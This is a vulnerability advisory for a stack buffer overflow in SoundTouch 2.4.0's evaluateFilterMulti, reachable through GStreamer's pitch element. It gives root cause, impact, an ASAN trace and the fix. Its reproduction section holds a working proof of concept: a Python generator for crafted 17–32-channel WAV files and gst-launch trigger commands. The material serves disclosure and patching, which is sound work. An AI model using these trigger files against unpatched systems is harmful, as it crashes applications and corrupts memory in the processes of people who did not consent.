# evaluateFilterMulti Stack Buffer Overflow

**Reporter**: Olivier Laflamme
**Pwno ID**: [`PWNO-0044-M`](https://bugs.pwno.io/0044)
**Published**: 2026-04-04

Summary
-------

SoundTouch 2.4.0 introduced a stack buffer overflow in `FIRFilter::evaluateFilterMulti()` by raising `SOUNDTOUCH_MAX_CHANNELS` from 16 to 32 while leaving a hardcoded `LONG_SAMPLETYPE sums[16]` stack array unchanged. Any application processing audio with 17–32 channels through SoundTouch's time-stretching or pitch-shifting pipeline will corrupt adjacent stack memory with attacker-controlled values derived from the audio sample data.

At `-O2` on ARM64, even the minimum overflow of 4 bytes (17 channels) causes an immediate SIGSEGV by corrupting callee-saved registers.

The bug was identified while fuzzing Firefox, where the bundled SoundTouch copy was updated via commit `83af3e64b68b`. Firefox is not currently exploitable due to an 8-channel cap and RLBox wasm2c sandboxing. However, standalone consumers, GStreamer, AviSynth+, and any application linking SoundTouch 2.4.0 with multichannel audio are vulnerable.

Root Cause
----------

Commit `ddf28667c9f52f30573853c8177e77149829fa7c` raised `SOUNDTOUCH_MAX_CHANNELS` from 16 to 32 in `STTypes.h`, updating the channel validation in `verifyNumberOfChannels()` to accept up to 32 channels. However, the stack buffer inside `evaluateFilterMulti()` was not updated:

c++

    // source/SoundTouch/FIRFilter.cpp — evaluateFilterMulti()
    LONG_SAMPLETYPE sums[16];  // hardcoded to old limit
    // ...
    for (c = 0; c < numChannels; c++)
        sums[c] = 0;           // writes up to sums[31]

`numChannels` passes validation (it's within `SOUNDTOUCH_MAX_CHANNELS`), but the stack buffer only holds 16 elements. Channels 16-31 write directly into adjacent stack frames.

Commit `ddf28667` doubled the channel limit in `STTypes.h` and relaxed the assertion in `evaluateFilterMulti()` to match, but never updated the buffer:

c

    assert(numChannels <= SOUNDTOUCH_MAX_CHANNELS);  // now allows 1..32
    LONG_SAMPLETYPE sums[16];                        // still 16
    
    for (c = 0; c < numChannels; c++)
        sums[c] = 0;                                 // OOB write when c >= 16

The assert compiles out in release builds. The channel count passes all library validation. Three loops read and write past `sums[15]` with values derived from the audio input, the attacker effectively controls what gets written to the stack.

This is a resurrection of CVE-2018-14045, which covered the old `assert(numChannels < 16)`. That fix relaxed the assertion but never touched the buffer. When the channel limit was later raised, the "fixed" assertion started passing for 17–32, turning a classified DoS into a stack overflow.

Attack Surface
--------------

GStreamer's `pitch` element (`gst-plugins-bad`) forwards channel counts to SoundTouch with no upper bound check:

c++

    priv->st->setChannels(pitch->info.channels);

The element's pad template allows any channel count:

plain text

    channels = (int) [ 1, MAX ]

This means any audio stream with more than 16 channels delivered as a file, network stream, or piped through a GStreamer pipeline reaches the vulnerable code path. The trigger does not require unusual API usage & it is the normal processing path for multichannel audio.

Realistic trigger via crafted WAV file:

bash

    gst-launch-1.0 \\
        filesrc location=evil_24ch.wav \\
        ! wavparse \\
        ! audioconvert \\
        ! "audio/x-raw,format=F32LE" \\
        ! pitch pitch=1.2 \\
        ! fakesink

Or directly via `audiotestsrc`:

bash

    gst-launch-1.0 \\
        audiotestsrc num-buffers=200 samplesperbuffer=4096 ! \\
        "audio/x-raw,format=F32LE,channels=24,rate=44100,layout=interleaved" ! \\
        pitch pitch=1.2 ! \\
        fakesink sync=false

It forwards channel counts to SoundTouch with no validation (`channels = (int) [ 1, MAX ]`), so a crafted multichannel WAV file played through any GStreamer app using the pitch plugin triggers the overflow.

plain text

    [root@d219eecce072 /]# gst-launch-1.0 \
    filesrc location=evil_24ch.wav \
    ! wavparse \
    ! audioconvert \
    ! "audio/x-raw,format=F32LE" \
    ! pitch pitch=1.2 \
    ! fakesink
    Setting pipeline to PAUSED ...
    Pipeline is PREROLLING ...
    Redistribute latency...
    *** stack smashing detected ***: terminated
    Aborted

Firefox bundles SoundTouch but is mitigated by an 8-channel cap in `AudioStream` and RLBox wasm2c sandboxing. Audacity is safe (always `setChannels(1)`). VLC, mpv, and Chromium don't use SoundTouch. Emulators (PCSX2, Dolphin, RPCS3) are hardcoded to stereo or 7.1. Arch Linux and Fedora Rawhide shipped 2.4.0.

Impact
------

At `-O2` on ARM64, `sums[16]` sits directly below saved callee registers. Even the minimum overflow (17 channels, 4 bytes) corrupts x28 and causes an immediate SEGV. With 32 channels the overflow is 64 bytes, reaching x28 through x19. With `-fstack-protector` (the default), the canary catches it and the process aborts. Without it, the attacker controls saved register values through the audio sample data & the overflow repeats per output frame.

**Affected downstream consumers include:**

*   GStreamer (`gst-plugins-bad` pitch element) via direct trigger path
*   Any application linking against SoundTouch 2.4.0 that processes multichannel audio

ASAN Trace
----------

plain text

    ==99057==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x00016b8a2420
      at pc 0x000104561438 bp 0x00016b8a23b0 sp 0x00016b8a23a8
    WRITE of size 4 at 0x00016b8a2420 thread T0
        #0 soundtouch::FIRFilter::evaluateFilterMulti(...)  FIRFilter.cpp:174
        #1 soundtouch::FIRFilter::evaluate(...)             FIRFilter.cpp:268
        #2 soundtouch::AAFilter::evaluate(...)              AAFilter.cpp:211
        #3 soundtouch::RateTransposer::processSamples(...)  RateTransposer.cpp:168
        #4 soundtouch::RateTransposer::putSamples(...)      RateTransposer.cpp:124
        #5 soundtouch::SoundTouch::putSamples(...)          SoundTouch.cpp:297
    
      [32, 96) 'sums' (line 168) <== Memory access at offset 96 overflows this variable

The `sums` buffer occupies bytes `[32, 96)` in the stack frame. 64 bytes for 16 `float`\-sized elements. The write at offset 96 is the 17th channel, one element past the end.

Reproduction
------------

### Step 1: Generate trigger files

python

    #!/usr/bin/env python3
    import struct, math
    
    SUB_FORMAT_PCM = (
        b'\\x01\\x00\\x00\\x00\\x00\\x00\\x10\\x00'
        b'\\x80\\x00\\x00\\xaa\\x00\\x38\\x9b\\x71'
    )
    
    def write_wav(filename, num_channels, sample_rate=44100, duration_sec=1):
        bits = 16
        num_samples = sample_rate * duration_sec
        bytes_per_sample = bits // 8
        block_align = num_channels * bytes_per_sample
        byte_rate = sample_rate * block_align
        data_size = num_samples * block_align
    
        pcm = bytearray()
        for i in range(num_samples):
            for ch in range(num_channels):
                if ch == 0:
                    val = 0.5 * math.sin(2 * math.pi * 440 * i / sample_rate)
                elif ch < 16:
                    val = 0.3 * math.sin(2 * math.pi * (220 + ch * 50) * i / sample_rate)
                else:
                    val = (ch * 100 + 0.5) / 32768.0
                sample = max(-32768, min(32767, int(val * 32767)))
                pcm += struct.pack('<h', sample)
    
        cb_size = 22
        fmt_chunk = struct.pack('<HHIIHHH',
            0xFFFE, num_channels, sample_rate, byte_rate,
            block_align, bits, cb_size)
        fmt_chunk += struct.pack('<HI', bits, 0)
        fmt_chunk += SUB_FORMAT_PCM
    
        riff_size = 4 + (8 + len(fmt_chunk)) + (8 + data_size)
        with open(filename, 'wb') as f:
            f.write(b'RIFF')
            f.write(struct.pack('<I', riff_size))
            f.write(b'WAVE')
            f.write(b'fmt ')
            f.write(struct.pack('<I', len(fmt_chunk)))
            f.write(fmt_chunk)
            f.write(b'data')
            f.write(struct.pack('<I', data_size))
            f.write(pcm)
    
    write_wav('evil_17ch.wav', 17)   # minimum overflow: 4 bytes
    write_wav('evil_24ch.wav', 24)   # moderate: 32 bytes
    write_wav('evil_32ch.wav', 32)   # maximum: 64 bytes

### Step 2: Trigger via GStreamer (Arch Linux)

bash

    gst-launch-1.0 \\
        filesrc location=evil_24ch.wav \\
        ! wavparse \\
        ! audioconvert \\
        ! "audio/x-raw,format=F32LE" \\
        ! pitch pitch=1.2 \\
        ! fakesink sync=false

Remediation
-----------

**SoundTouch fix** (shipped in 2.4.1, commit `0047e0b1ec`, 2026-03-29):

diff

    - LONG_SAMPLETYPE sums[16];
    + LONG_SAMPLETYPE sums[SOUNDTOUCH_MAX_CHANNELS];

**GStreamer mitigation** (reported as [#4956](https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/4956)): The `pitch` element should validate or cap channel counts before passing them to third-party DSP libraries, rather than forwarding `[ 1, MAX ]` unchecked.
